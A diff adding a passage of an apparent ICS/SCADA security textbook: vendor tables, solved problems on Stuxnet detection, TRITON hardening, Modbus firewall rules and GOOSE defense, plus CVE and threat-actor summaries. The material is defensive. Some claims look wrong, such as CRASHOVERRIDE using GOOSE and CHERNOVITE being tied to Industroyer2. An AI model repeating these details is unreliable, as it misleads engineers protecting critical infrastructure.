+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">Modbus TCP proxy FW</td>
+</tr>
+<tr>
+<td style="text-align: left;">Industrial FW</td>
+<td style="text-align: left;">Phoenix FL MGUARD 2102</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">DIN-rail ICS firewall</td>
+</tr>
+<tr>
+<td style="text-align: left;">Industrial FW</td>
+<td style="text-align: left;">Check Point 1570R</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">Rugged NGFW OT</td>
+</tr>
+<tr>
+<td style="text-align: left;">Data Diode</td>
+<td style="text-align: left;">Waterfall Security USSG</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">Unidirectional GW</td>
+</tr>
+<tr>
+<td style="text-align: left;">Data Diode</td>
+<td style="text-align: left;">Owl Cyber Defense OPDS</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">High-speed data diode</td>
+</tr>
+<tr>
+<td style="text-align: left;">Data Diode</td>
+<td style="text-align: left;">Advenica ZoneGuard</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">EU/govt data diode</td>
+</tr>
+<tr>
+<td style="text-align: left;">PLC (Secure)</td>
+<td style="text-align: left;">Siemens S7-1500 TM</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">Secure PLC (Trust Mod)</td>
+</tr>
+<tr>
+<td style="text-align: left;">PLC (Secure)</td>
+<td style="text-align: left;">Rockwell ControlLogix 5580</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">CIP Security EtherNet/IP</td>
+</tr>
+<tr>
+<td style="text-align: left;">PLC (Secure)</td>
+<td style="text-align: left;">Schneider Modicon M580</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">IEC 62443 SL-2 PLC</td>
+</tr>
+<tr>
+<td style="text-align: left;">DCS (Secure)</td>
+<td style="text-align: left;">Honeywell EPKS C300</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">Post-TRITON hardened</td>
+</tr>
+<tr>
+<td style="text-align: left;">DCS (Secure)</td>
+<td style="text-align: left;">ABB System 800xA</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">Cybersecurity certified</td>
+</tr>
+<tr>
+<td style="text-align: left;">RTU (Secure)</td>
+<td style="text-align: left;">GE D20MX</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">DNP3 SAv5 RTU</td>
+</tr>
+<tr>
+<td style="text-align: left;">RTU (Secure)</td>
+<td style="text-align: left;">SEL-3530 RTAC</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">Authenticated DNP3/IEC</td>
+</tr>
+<tr>
+<td style="text-align: left;">OT SIEM</td>
+<td style="text-align: left;">Splunk Enterprise Security</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">OT log correlation</td>
+</tr>
+<tr>
+<td style="text-align: left;">OT SIEM</td>
+<td style="text-align: left;">IBM QRadar OT Security</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">ICS threat analytics</td>
+</tr>
+<tr>
+<td style="text-align: left;">Open ICS Tools</td>
+<td style="text-align: left;">OpenDNP3</td>
+<td style="text-align: left;">Open Source</td>
+<td style="text-align: left;">DNP3 implementation</td>
+</tr>
+<tr>
+<td style="text-align: left;">Open ICS Tools</td>
+<td style="text-align: left;">libiec61850</td>
+<td style="text-align: left;">Open Source</td>
+<td style="text-align: left;">IEC 61850 + GOOSE</td>
+</tr>
+<tr>
+<td style="text-align: left;">Open ICS Tools</td>
+<td style="text-align: left;">InduSoft Web Studio</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">SCADA HMI platform</td>
+</tr>
+<tr>
+<td style="text-align: left;">Open ICS Tools</td>
+<td style="text-align: left;">ScadaBR</td>
+<td style="text-align: left;">Open Source</td>
+<td style="text-align: left;">Open SCADA platform</td>
+</tr>
+<tr>
+<td style="text-align: left;">Research</td>
+<td style="text-align: left;">GRFICS (Georgia Tech)</td>
+<td style="text-align: left;">Open Source</td>
+<td style="text-align: left;">ICS security testbed</td>
+</tr>
+<tr>
+<td style="text-align: left;">Research</td>
+<td style="text-align: left;">SWaT Testbed (iTrust)</td>
+<td style="text-align: left;">Research</td>
+<td style="text-align: left;">Water treatment ICS</td>
+</tr>
+<tr>
+<td style="text-align: left;">Threat Intel</td>
+<td style="text-align: left;">Dragos WorldView ICS</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">ICS threat intel</td>
+</tr>
+<tr>
+<td style="text-align: left;">Threat Intel</td>
+<td style="text-align: left;">Mandiant OT/ICS Reports</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">ICS incident reporting</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<h2 id="3116-solved-problems"><span class="secnum">31.16</span> Solved Problems<a class="headerlink" href="#3116-solved-problems" title="Permanent link">&para;</a></h2>
+<div class="admonition example box-solvedproblem kind-example">
+<p class="admonition-title">Solved Problem: Stuxnet OB35 Detection Strategy</p>
+<p>A Siemens Step7 / S7-PLCSIM environment is being audited for potential Stuxnet contamination. Describe a detection strategy that does not rely on antivirus signatures, targeting the OB35 injection technique specifically. The auditor has access to the Step7 project files and a JTAG-connected hardware debugger.</p>
+</div>
+<p><strong>Solution:</strong> Stuxnet detection strategy without antivirus signatures:</p>
+<ol>
+<li>
+<p><strong>Direct PLC memory readback via S7comm protocol (bypass hooked DLL):</strong> Stuxnet’s key evasion technique hooks S7OTBXDX.DLL to hide OB35 from the Step7 IDE. However, a direct S7comm connection using a modified client (Siemens S7comm-plus protocol) that does not go through the hooked DLL can read the actual OB35 block from the PLC memory:</p>
+<div class="language-text highlight"><pre><span></span><code># Using Snap7 library (bypasses S7OTBXDX.DLL):
+import snap7
+client = snap7.client.Client()
+client.connect("192.168.1.100", 0, 1)
+ob35_data = client.upload(client.BlocksList())
+# Compare ob35_data with Step7 project source -&gt; discrepancy = Trojan
+</code></pre></div>
+</li>
+<li>
+<p><strong>Hash comparison of OB35:</strong> Extract OB35 from both the Step7 project (from the .s7p file, decompiled) and directly from the PLC via Snap7. Compute SHA-256 of both. Any difference indicates tampering.</p>
+</li>
+<li>
+<p><strong>VFD frequency command audit:</strong> Stuxnet modifies frequency setpoint writes to Profibus-connected VFDs. A timing analysis of Profibus DP traffic between the S7-315 and the frequency converters (Vacon or Fararo Paya model) shows anomalous frequency changes (1410 Hz / 2 Hz) outside the expected operating range. Deploy a Profibus TAP (passive monitor) to capture raw Profibus DP frames.</p>
+</li>
+<li>
+<p><strong>JTAG hardware debug:</strong> Halt the S7-315 CPU via JTAG (Siemens uses a proprietary debug interface on the front panel). Read OB35 directly from CPU SRAM at the known address (extracted from Step7 documentation). This bypasses all DLL hooking and provides a ground-truth view of the running program.</p>
+</li>
+<li>
+<p><strong>S7OTBXDX.DLL integrity check:</strong> On the engineering workstation, compute SHA-256 of C:\Siemens\Step7\Bin\S7OTBXDX.DLL and compare against known-good hash from Siemens. Stuxnet replaces this file; file size will be 346 KB (malicious) vs. 149 KB (genuine).</p>
+</li>
+</ol>
+<div class="admonition example box-solvedproblem kind-example">
+<p class="admonition-title">Solved Problem: TRITON Threat Mitigation Design</p>
+<p>Following the 2017 TRITON attack, a petrochemical plant must harden its Triconex-based SIS architecture. Design a defense-in-depth architecture that addresses the three root causes identified by Dragos: (1) no authentication on TriStation 1131 protocol, (2) DIP switch PROGRAM mode accessible remotely, (3) no logging of programming access. Specify hardware and network controls for each.</p>
+</div>
+<p><strong>Solution:</strong> Defense-in-depth architecture addressing each root cause:</p>
+<p><strong>Root Cause 1 – No TriStation authentication:</strong></p>
+<ul>
+<li>
+<p>Install the Schneider Electric Trident Nexus Security Module (NSM) on all Tricon chassis. The NSM enforces HMAC-SHA256 authentication on all TriStation 1131 connections.</p>
+</li>
+<li>
+<p>Deploy a dedicated, isolated engineering network for SIS access (separate physical switches, not VLAN-separated from DCS network). This network has no routing to the corporate IT network.</p>
+</li>
+<li>
+<p>Implement a hardware firewall (Hirschmann EAGLE40) on the SIS engineering network permitting TriStation traffic (UDP 1502) only from a single, authorized engineering workstation IP.</p>
+</li>
+</ul>
+<p><strong>Root Cause 2 – DIP switch PROGRAM mode:</strong></p>
+<ul>
+<li>
+<p>Physical lockout: Install a keyed security enclosure over the Tricon chassis front panel. The DIP switch is accessible only with a physical key held by the SIS engineer.</p>
+</li>
+<li>
+<p>Process control: Require a Management of Change (MoC) work order plus two-person authorization before the DIP switch is placed in PROGRAM mode. The key is held in a tamper-evident safe with access logged.</p>
+</li>
+<li>
+<p>NSM enforcement: Configure the NSM to require a separate authentication credential (hardware token, e.g., Yubikey 5C) even when the DIP switch is in PROGRAM mode. Remote programming without physical presence at the chassis is disabled.</p>
+</li>
+</ul>
+<p><strong>Root Cause 3 – No programming access logging:</strong></p>
+<ul>
+<li>
+<p>NSM logging: The Nexus Security Module cryptographically signs and timestamps all programming access events. Logs are transmitted via unidirectional data diode (Waterfall Security) from the SIS network to a read-only historian on the DCS network.</p>
+</li>
+<li>
+<p>Behavioral monitoring: Deploy Nozomi Networks Guardian on the SIS engineering network segment. Any TriStation protocol traffic outside authorized maintenance windows triggers an immediate alert.</p>
+</li>
+<li>
+<p>Physical access logging: Door access control (badge + PIN) to the SIS control room is logged to a centralized SIEM with correlation: DIP switch mode change must coincide with authorized personnel badge access within 5 minutes.</p>
+</li>
+</ul>
+<div class="admonition example box-solvedproblem kind-example">
+<p class="admonition-title">Solved Problem: Modbus TCP Function Code Whitelist Design</p>
+<p>A water treatment plant SCADA system uses Modbus TCP to communicate between a SCADA master (IP 10.1.1.10) and 15 RTUs controlling pump stations (IPs 10.1.2.1–10.1.2.15). Design a Modbus TCP firewall rule set that restricts communication to the minimum necessary function codes for normal operations while detecting and blocking attack function codes.</p>
+</div>
+<p><strong>Solution:</strong> Modbus TCP firewall rule design:</p>
+<p>Normal operation analysis:</p>
+<ul>
+<li>
+<p>SCADA reads sensor data: FC03 (Read Holding Registers) from each RTU – water level, flow rate, pressure.</p>
+</li>
+<li>
+<p>SCADA reads pump status: FC01 (Read Coils) – pump running/stopped.</p>
+</li>
+<li>
+<p>SCADA writes pump commands: FC05 (Write Single Coil) – pump start/stop during authorized operation windows.</p>
+</li>
+<li>
+<p>SCADA writes setpoints: FC16 (Write Multiple Registers) – flow rate setpoints, alarm thresholds.</p>
+</li>
+</ul>
+<p>Firewall rule set (implemented in Fortinet FortiGate with Modbus AppID):</p>
+<div class="language-text highlight"><pre><span></span><code># Modbus TCP firewall policy (FortiGate CLI):
+
+config firewall policy
+  edit 10
+    set name "SCADA-to-RTU-READ"
+    set srcintf "SCADA_VLAN"
+    set dstintf "OT_VLAN"
+    set srcaddr "SCADA_MASTER_10.1.1.10"
+    set dstaddr "RTU_POOL_10.1.2.0/24"
+    set service "MODBUS_READ"  # FC01,FC02,FC03,FC04 only
+    set schedule "always"
+    set action accept
+    set logtraffic all
+  next
+  edit 11
+    set name "SCADA-to-RTU-WRITE-AUTHORIZED"
+    set srcaddr "SCADA_MASTER_10.1.1.10"
+    set dstaddr "RTU_POOL_10.1.2.0/24"
+    set service "MODBUS_WRITE"  # FC05,FC06,FC16 only
+    set schedule "OPERATIONAL_HOURS"  # 06:00-22:00 only
+    set action accept
+    set logtraffic all
+  next
+  edit 12
+    set name "BLOCK-DANGEROUS-FC"
+    # Block FC08 (Diagnostics), FC43 (Device ID), FC64-72 (user-defined)
+    set service "MODBUS_DANGEROUS"
+    set action deny
+    set logtraffic all  # Alert on any attempt
+  next
+  edit 13
+    set name "BLOCK-UNAUTHORIZED-MODBUS"
+    # Any Modbus traffic not from SCADA master -&gt; deny and alert
+    set dstaddr "RTU_POOL_10.1.2.0/24"
+    set service "MODBUS_TCP"
+    set action deny
+    set logtraffic all
+  next
+</code></pre></div>
+<p>Detection: Nozomi Networks passive monitoring generates an alert for: FC08 from any source; FC05/FC16 outside operational hours; Modbus traffic from any IP other than 10.1.1.10; FC43 (device enumeration preceding targeted attack); rapid sequential writes to the same register address (coil cycling indicating manipulation).</p>
+<div class="admonition example box-solvedproblem kind-example">
+<p class="admonition-title">Solved Problem: IEC 62443 Security Level Assessment for Power Substation</p>
+<p>A utility company must assess the Security Level achieved by their 138kV transmission substation. The substation uses: SEL-421 protection relays (DNP3 over Ethernet, no SAv5), ABB RTU500 SCADA gateway (IEC 104, no authentication), Cisco IE3400 switch with VLAN segmentation (no 802.1X), and a T-Mobile cellular backup link (no VPN). Determine the achieved SL and the gap to SL-2.</p>
+</div>
+<p><strong>Solution:</strong> IEC 62443-3-3 Security Level assessment against SR (Security Requirement) families:</p>
+<p><strong>Current State Analysis:</strong></p>
+<p>SR 1.1 – Human User Identification and Authentication: FAILED. DNP3 and IEC 104 have no user authentication; any device can send commands. Current SL: SL-0.</p>
+<p>SR 1.3 – Account Management: FAILED. No per-user accounts on RTU or protection relays. Current SL: SL-0.</p>
+<p>SR 2.1 – Authorization Enforcement: FAILED. All Modbus/DNP3/IEC104 clients have read+write access; no role-based restriction. Current SL: SL-0.</p>
+<p>SR 3.1 – Communication Integrity: FAILED. DNP3 without SAv5 and IEC 104 without IEC 62351-5 have no message authentication. Current SL: SL-0.</p>
+<p>SR 3.3 – Security Functionality Verification: PARTIAL. Physical access to relays allows manual verification. No automated integrity check. Current SL: SL-1.</p>
+<p>SR 5.1 – Network Segmentation: PARTIAL. VLANs exist but without 802.1X; VLAN spoofing is possible. Current SL: SL-1.</p>
+<p>SR 5.2 – Zone Boundary Protection: FAILED. Cellular backup link with no VPN provides an unauthenticated path to the OT network. Current SL: SL-0.</p>
+<p><strong>Achieved Overall SL: SL-0 to SL-1 (below SL-2 target).</strong></p>
+<p><strong>Gaps to SL-2 and Remediation:</strong></p>
+<ol>
+<li>
+<p>Enable DNP3 SAv5 on SEL-421 relays (SEL firmware supports SAv5 from version 3.0): provides HMAC message authentication.</p>
+</li>
+<li>
+<p>Upgrade ABB RTU500 to support IEC 62351-5 (authenticated IEC 104), or deploy a protocol proxy (Schweitzer Engineering SEL-3620) that adds authentication.</p>
+</li>
+<li>
+<p>Enable 802.1X on Cisco IE3400 with MAB for relays that cannot support 802.1X supplicant.</p>
+</li>
+<li>
+<p>Deploy IPsec VPN on T-Mobile cellular link (Cisco ASR 901 with FlexVPN, AES-256-GCM, IKEv2 with certificate authentication).</p>
+</li>
+<li>
+<p>Cost-benefit: Implementation cost is approximately &#36;180K; the substation supports 40,000 customers. NERC CIP-005 also mandates these controls for transmission substations.</p>
+</li>
+</ol>
+<div class="admonition example box-solvedproblem kind-example">
+<p class="admonition-title">Solved Problem: CRASHOVERRIDE GOOSE Attack Defense</p>
+<p>The CRASHOVERRIDE malware sent malicious GOOSE (Generic Object Oriented Substation Event) messages on an IEC 61850 station bus to trip circuit breakers. Design a protection relay configuration and network security control that detects and blocks unauthorized GOOSE messages without disrupting legitimate protection operations.</p>
+</div>
+<p><strong>Solution:</strong> GOOSE attack characteristics: GOOSE messages are multicast (Ethernet layer 2, no IP), sent to the multicast MAC 01:0C:CD:01:XX:XX, with no authentication in IEC 61850 Ed.1/Ed.2. The attacker sends CB_OFF (circuit breaker open) GOOSE messages with high priority (StNum=1, SqNum=0, T=current time) that protection relays accept as legitimate.</p>
+<p>Defense architecture:</p>
+<p><strong>Layer 1 – GOOSE subscription whitelist per relay:</strong> Configure each protection relay (SEL-451, GE Multilin L90) to subscribe to GOOSE messages only from specific publisher MAC addresses:</p>
+<div class="language-text highlight"><pre><span></span><code># SEL-451 Relay: GOOSE Subscription Configuration
+# Only accept GOOSE from the specific Bus Protection IED (L90):
+GSE_SUB 1:
+  APPID = 0x0001
+  SrcMAC = 00:A0:7A:12:34:56  # L90 IED MAC address
+  GoCBRef = "L90LD0/LLN0$GO$GGIO_CB_Status"
+  AllowTrip = YES
+# Any GOOSE from other MAC address is ignored
+</code></pre></div>
+<p><strong>Layer 2 – GOOSE rate limiting and anomaly detection:</strong> Deploy a managed switch (GE Multilin D400 or ABB FOX-U) with GOOSE traffic inspection. Configure: maximum 5 GOOSE messages per second per APPID (legitimate protection GOOSE during a fault: <span class="arithmatex">\(&lt;\)</span>3 per second). More than 5 GOOSE/second from any source: switch drops excess and generates SNMP trap. An attacker’s GOOSE flood (CRASHOVERRIDE sent hundreds per second) triggers the rate limiter.</p>
+<p><strong>Layer 3 – IEC 61850 Ed.2 GOOSE Authentication (future):</strong> IEC 62351-6 defines HMAC authentication for GOOSE using AES-128-GMAC appended to the GOOSE frame. This requires: hardware crypto accelerator in the IED (most modern relays support it), key management infrastructure for substation (pairwise keys between publishers and subscribers), and a key update procedure that avoids gaps in protection during key rotation.</p>
+<p><strong>Layer 4 – Behavioral baseline anomaly:</strong> Nozomi Networks Guardian baseline: CB_OFF GOOSE messages are expected only during fault conditions (correlates with relay analog inputs showing overcurrent, overvoltage, or differential current). A CB_OFF GOOSE with no correlated analog fault event = anomaly alert within 500ms.</p>
+<h2 id="3117-standards"><span class="secnum">31.17</span> Standards<a class="headerlink" href="#3117-standards" title="Permanent link">&para;</a></h2>
+<div class="tbl" id="tab-ics-standards">
+<div class="tbl-caption"><strong>Table 31.7.</strong> ICS and SCADA Hardware Security Standards</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Standard</strong></th>
+<th style="text-align: left;"><strong>Organization</strong></th>
+<th style="text-align: left;"><strong>Scope</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">IEC 62443-1-1</td>
+<td style="text-align: left;">IEC</td>
+<td style="text-align: left;">IACS security concepts and models</td>
+</tr>
+<tr>
+<td style="text-align: left;">IEC 62443-2-1</td>
+<td style="text-align: left;">IEC</td>
+<td style="text-align: left;">IACS security management system</td>
+</tr>
+<tr>
+<td style="text-align: left;">IEC 62443-3-2</td>
+<td style="text-align: left;">IEC</td>
+<td style="text-align: left;">Zone and conduit security risk assessment</td>
+</tr>
+<tr>
+<td style="text-align: left;">IEC 62443-3-3</td>
+<td style="text-align: left;">IEC</td>
+<td style="text-align: left;">System security requirements and SL</td>
+</tr>
+<tr>
+<td style="text-align: left;">IEC 62443-4-2</td>
+<td style="text-align: left;">IEC</td>
+<td style="text-align: left;">Component technical security requirements</td>
+</tr>
+<tr>
+<td style="text-align: left;">NIST SP 800-82r3</td>
+<td style="text-align: left;">NIST</td>
+<td style="text-align: left;">Guide to OT Security (2023)</td>
+</tr>
+<tr>
+<td style="text-align: left;">NIST SP 800-183</td>
+<td style="text-align: left;">NIST</td>
+<td style="text-align: left;">Networks of Things (IIoT security)</td>
+</tr>
+<tr>
+<td style="text-align: left;">NERC CIP-002-5.1</td>
+<td style="text-align: left;">NERC</td>
+<td style="text-align: left;">BES Cyber System categorization</td>
+</tr>
+<tr>
+<td style="text-align: left;">NERC CIP-005-6</td>
+<td style="text-align: left;">NERC</td>
+<td style="text-align: left;">Electronic security perimeter</td>
+</tr>
+<tr>
+<td style="text-align: left;">NERC CIP-007-6</td>
+<td style="text-align: left;">NERC</td>
+<td style="text-align: left;">Systems security management</td>
+</tr>
+<tr>
+<td style="text-align: left;">NERC CIP-010-3</td>
+<td style="text-align: left;">NERC</td>
+<td style="text-align: left;">Configuration change management</td>
+</tr>
+<tr>
+<td style="text-align: left;">NERC CIP-013-1</td>
+<td style="text-align: left;">NERC</td>
+<td style="text-align: left;">Supply chain risk management</td>
+</tr>
+<tr>
+<td style="text-align: left;">IEC 61511-1</td>
+<td style="text-align: left;">IEC</td>
+<td style="text-align: left;">Safety instrumented systems lifecycle</td>
+</tr>
+<tr>
+<td style="text-align: left;">IEC 62351-3</td>
+<td style="text-align: left;">IEC</td>
+<td style="text-align: left;">Profiles including TCP/IP (TLS)</td>
+</tr>
+<tr>
+<td style="text-align: left;">IEC 62351-5</td>
+<td style="text-align: left;">IEC</td>
+<td style="text-align: left;">IEC 60870-5 and DNP3 security</td>
+</tr>
+<tr>
+<td style="text-align: left;">IEC 62351-6</td>
+<td style="text-align: left;">IEC</td>
+<td style="text-align: left;">IEC 61850 security (GOOSE/SMV)</td>
+</tr>
+<tr>
+<td style="text-align: left;">IEC 60870-5-104</td>
+<td style="text-align: left;">IEC</td>
+<td style="text-align: left;">Telecontrol protocol (no auth baseline)</td>
+</tr>
+<tr>
+<td style="text-align: left;">IEEE 1815-2012</td>
+<td style="text-align: left;">IEEE</td>
+<td style="text-align: left;">DNP3 with Secure Authentication v5</td>
+</tr>
+<tr>
+<td style="text-align: left;">IEC 61850 Ed.2</td>
+<td style="text-align: left;">IEC</td>
+<td style="text-align: left;">Substation automation (GOOSE, MMS)</td>
+</tr>
+<tr>
+<td style="text-align: left;">ISA-99</td>
+<td style="text-align: left;">ISA</td>
+<td style="text-align: left;">Industrial automation cybersecurity</td>
+</tr>
+<tr>
+<td style="text-align: left;">MITRE ATT&amp;CK ICS</td>
+<td style="text-align: left;">MITRE</td>
+<td style="text-align: left;">ICS adversary technique framework</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<h2 id="sec-ch31-recent"><span class="secnum">31.18</span> Recent Developments (2024–2026)<a class="headerlink" href="#sec-ch31-recent" title="Permanent link">&para;</a></h2>
+<p>ICS and SCADA security entered a period of heightened national security focus between 2023 and 2025, driven by Chinese state-sponsored intrusions into critical infrastructure and NIST’s updated OT security guidance.</p>
+<h3 id="31181-cisa-ics-cert-advisories-20232024-siemens-and-rockwell-vulnerabilities"><span class="secnum">31.18.1</span> CISA ICS-CERT Advisories 2023–2024 — Siemens and Rockwell Vulnerabilities<a class="headerlink" href="#31181-cisa-ics-cert-advisories-20232024-siemens-and-rockwell-vulnerabilities" title="Permanent link">&para;</a></h3>
+<p>CISA published a significant volume of ICS-CERT advisories targeting major PLC vendors:</p>
+<p><strong>Siemens SIMATIC S7-1500 / SIMATIC S7-1200 (2023–2024):</strong></p>
+<ul>
+<li>
+<p><strong>CVE-2023-28831 (CVSS 9.8):</strong> Heap buffer overflow in the SIMATIC S7-1500 OPC UA server allows unauthenticated remote code execution. Affected versions: V3.0.0 to V3.0.1. Siemens Security Advisory SSA-892048 (July 2023) recommended firmware update to V3.0.2.</p>
+</li>
+<li>
+<p><strong>CVE-2023-44318 (CVSS 6.5):</strong> Web server on SIMATIC S7-1200 and S7-1500 CPUs allows directory traversal to read arbitrary files from the PLC filesystem, including private key material if TLS certificates are stored on the PLC flash.</p>
+</li>
+<li>
+<p><strong>SIMATIC S7 PROFINET discovery:</strong> Multiple 2024 advisories (SSA-711928, SSA-953287) documented that PROFINET Discovery and Configuration Protocol (DCP) enabled unauthenticated device renaming and IP address modification, effectively enabling denial-of-service against any SIMATIC device on the PROFINET segment.</p>
+</li>
+</ul>
+<p><strong>Rockwell Automation ControlLogix (2023):</strong></p>
+<ul>
+<li>
+<p><strong>CVE-2023-3595 (CVSS 9.8) and CVE-2023-3596:</strong> Remote code execution vulnerabilities in Allen-Bradley ControlLogix EtherNet/IP communication module (1756-EN2T series). Attackers with network access to the EtherNet/IP port could execute arbitrary code in the communication module’s firmware, modifying ladder logic execution without the engineering workstation detecting the change. CISA ICSA-23-221-01 (August 2023) identified active exploitation in the wild.</p>
+</li>
+<li>
+<p><strong>Impact:</strong> ControlLogix is deployed in approximately 40% of US petrochemical and power generation facilities. The vulnerability’s high CVSS and active exploitation prompted immediate patch guidance from CISA.</p>
+</li>
+</ul>
+<div class="admonition warning box-warnbox kind-safety">
+<p><strong>Warning:</strong> CVE-2023-3595 was discovered by Dragos researchers as part of an investigation into active ICS threat group activity. The vulnerability had been exploited in the wild before public disclosure. Unpatched ControlLogix 1756-EN2T modules connected to networks accessible from corporate IT segments are a critical exposure.</p>
+</div>
+<h3 id="31182-volt-typhoon-chinese-apt-targeting-critical-infrastructure-hardware"><span class="secnum">31.18.2</span> Volt Typhoon — Chinese APT Targeting Critical Infrastructure Hardware<a class="headerlink" href="#31182-volt-typhoon-chinese-apt-targeting-critical-infrastructure-hardware" title="Permanent link">&para;</a></h3>
+<p>CISA, NSA, and FBI issued a joint Cybersecurity Advisory (AA23-144A, May 2023) on Volt Typhoon (also tracked as Bronze Silhouette), a Chinese state-sponsored threat actor conducting long-term persistent access to US critical infrastructure OT networks:</p>
+<ul>
+<li>
+<p><strong>Target sectors:</strong> Communications, energy, transportation, and water and wastewater systems. Particular focus on pre-positioning within OT networks that could cause disruption in a Taiwan conflict scenario.</p>
+</li>
+<li>
+<p><strong>Living-off-the-land (LOTL) techniques:</strong> Volt Typhoon avoided malware by using legitimate system administration tools (wmic, ntdsutil, netsh, PowerShell) to enumerate OT networks, avoiding detection by signature-based IDS. Hardware devices targeted included:</p>
+<ul>
+<li>
+<p>Cisco and Fortinet edge routers (initial access, VPN credential harvesting)</p>
+</li>
+<li>
+<p>SCADA historian servers (OPC DA data exfiltration)</p>
+</li>
+<li>
+<p>Operational Technology-specific hardware: Schweitzer Engineering Laboratories (SEL) protective relays accessed via DNP3 after lateral movement from IT to OT networks</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Hardware-targeted persistence:</strong> In some intrusions, Volt Typhoon operators installed firmware modifications on Cisco RV320/325 small business routers (CVE-2019-1653) to maintain persistent covert access to operational technology sites even after corporate network cleanup.</p>
+</li>
+<li>
+<p><strong>Duration:</strong> CISA assessed that Volt Typhoon had been present in some victim networks for 5 years prior to detection.</p>
+</li>
+</ul>
+<h3 id="31183-nist-sp-800-82-revision-3-updated-ot-security-guide-2023"><span class="secnum">31.18.3</span> NIST SP 800-82 Revision 3 — Updated OT Security Guide (2023)<a class="headerlink" href="#31183-nist-sp-800-82-revision-3-updated-ot-security-guide-2023" title="Permanent link">&para;</a></h3>
+<p>NIST Special Publication 800-82 Revision 3, “Guide to Operational Technology (OT) Security” (September 2023) substantially updated the OT security framework:</p>
+<ul>
+<li>
+<p><strong>Zero Trust Architecture for OT:</strong> SP 800-82r3 introduces ZTA concepts for OT environments, acknowledging that traditional Purdue Model perimeter-based security is insufficient against advanced persistent threats that have already bridged the IT/OT air gap. Micro-segmentation of OT device communications is recommended.</p>
+</li>
+<li>
+<p><strong>Hardware security controls for legacy PLCs:</strong> New Section 6.2.5 addresses compensating controls for PLCs with no native authentication (Modbus RTU, DNP3 without SAv5), including unidirectional security gateways (Waterfall Security, OWL Cyber Defense) as hardware-enforced data-diode solutions.</p>
+</li>
+<li>
+<p><strong>Firmware integrity for ICS:</strong> SP 800-82r3 recommends firmware signing and verification for all new ICS hardware procurement, aligned with NIST SP 800-193 Platform Firmware Resilience guidelines. Legacy devices without secure boot should be compensated with network-level anomaly detection.</p>
+</li>
+</ul>
+<h3 id="31184-iec-62443-3-3-sl-3-hardware-requirements-2023-update"><span class="secnum">31.18.4</span> IEC 62443-3-3 SL-3 Hardware Requirements (2023 Update)<a class="headerlink" href="#31184-iec-62443-3-3-sl-3-hardware-requirements-2023-update" title="Permanent link">&para;</a></h3>
+<p>IEC 62443-3-3 (System Security Requirements and Security Levels), 2023 amendment, clarified Security Level 3 (SL-3) hardware requirements for industrial control systems defending against sophisticated adversaries (nation-state level threats):</p>
+<div class="tbl" id="tab-iec62443-sl3">
+<div class="tbl-caption"><strong>Table 31.8.</strong> IEC 62443-3-3 SL-3 Hardware-Specific Requirements (2023)</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Security Requirement</strong></th>
+<th style="text-align: left;"><strong>SL-3 Specification</strong></th>
+<th style="text-align: left;"><strong>Hardware Implementation</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">SR 1.1 Human Auth</td>
+<td style="text-align: left;">Hardware multi-factor authentication</td>
+<td style="text-align: left;">Smart card + PIN for all engineering access</td>
+</tr>
+<tr>
+<td style="text-align: left;">SR 3.1 Communication Integrity</td>
+<td style="text-align: left;">AES-128-CMAC per message with replay prevention</td>
+<td style="text-align: left;">DNP3 SAv5 or IEC 62351-5 hardware authenticator</td>
+</tr>
+<tr>
+<td style="text-align: left;">SR 3.8 Session Integrity</td>
+<td style="text-align: left;">All sessions authenticated and integrity protected</td>
+<td style="text-align: left;">TLS 1.3 hardware offload at SCADA gateway</td>
+</tr>
+<tr>
+<td style="text-align: left;">SR 5.2 Zone Boundary</td>
+<td style="text-align: left;">Hardware-enforced unidirectional flow between zones</td>
+<td style="text-align: left;">Data diode for historian connections</td>
+</tr>
+<tr>
+<td style="text-align: left;">SR 7.6 Network / Security Config Settings</td>
+<td style="text-align: left;">Physical lockout of network configuration</td>
+<td style="text-align: left;">Hardware key switch on switch/router front panel</td>
+</tr>
+<tr>
+<td style="text-align: left;">SR 7.8 Control System Component Inventory</td>
+<td style="text-align: left;">Automated hardware inventory with anomaly detection</td>
+<td style="text-align: left;">Passive network tap + hardware fingerprinting</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<h3 id="31185-dragos-year-in-review-2023-ics-threat-groups-targeting-hardware"><span class="secnum">31.18.5</span> Dragos Year in Review 2023 — ICS Threat Groups Targeting Hardware<a class="headerlink" href="#31185-dragos-year-in-review-2023-ics-threat-groups-targeting-hardware" title="Permanent link">&para;</a></h3>
+<p>Dragos’s 2023 Year in Review report identified 21 active threat groups targeting industrial control systems. Hardware-focused activities included:</p>
+<ul>
+<li>
+<p><strong>CHERNOVITE (Industroyer2):</strong> Continued development of ICS-specific malware targeting Siemens SIMATIC and ABB RTU hardware via IEC 104 and IEC 61850 protocols. CHERNOVITE demonstrated capability to issue direct IED (Intelligent Electronic Device) control commands bypassing the SCADA master.</p>
+</li>
+<li>
